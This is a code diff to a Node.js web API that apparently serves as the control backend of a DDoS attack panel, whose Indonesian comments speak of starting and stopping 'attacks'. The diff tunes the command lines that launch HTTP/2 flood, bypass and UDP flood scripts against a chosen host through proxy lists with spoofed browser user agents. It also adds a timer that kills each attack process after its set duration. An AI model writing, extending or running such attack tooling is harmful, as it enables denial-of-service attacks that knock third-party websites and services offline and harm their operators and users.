@@ -22,7 +22,7 @@ const activeProcesses = new Map();
 const generateCommand = (method, host, port, time) => {
     switch (method) {
         case 'H2FLASH':
-            return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 4 proxy.txt`;
+            return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 2 proxy.txt`;
         case 'H2FLOOD':
             return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 64 4 proxy.txt`;
         case 'CATMIA':
@@ -38,7 +38,7 @@ const generateCommand = (method, host, port, time) => {
         case 'RAW':
             return `cd /root/methods && node Raw.js ${host} ${time}`;
         case 'H2BYPASS':
-            return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 8 4 proxy.txt`;
+            return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 8 8 proxy.txt`;
         case 'H2MERIS':
             return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
         case 'UDP':
@@ -95,9 +95,20 @@ app.get('/api', (req, res) => {
 
     process.on('close', (code) => {
         console.log(`${method} Process exited with code ${code}`);
+        activeProcesses.delete(process.pid);  // Menghapus proses dari activeProcesses setelah selesai
     });
 
     activeProcesses.set(process.pid, process);
+
+    // Menghentikan serangan otomatis setelah durasi (time) yang diberikan
+    const durationInMs = parseInt(time, 10) * 1000; // Mengonversi durasi dari detik ke milidetik
+    setTimeout(() => {
+        if (activeProcesses.has(process.pid)) {
+            console.log(`${method} timeout reached. Stopping attack.`);
+            process.kill();  // Menghentikan proses setelah timeout
+            activeProcesses.delete(process.pid); // Menghapus proses dari daftar aktif
+        }
+    }, durationInMs); // Durasi yang diberikan dalam milidetik
 });
 
 // Endpoint untuk menghentikan semua serangan yang sedang berjalan
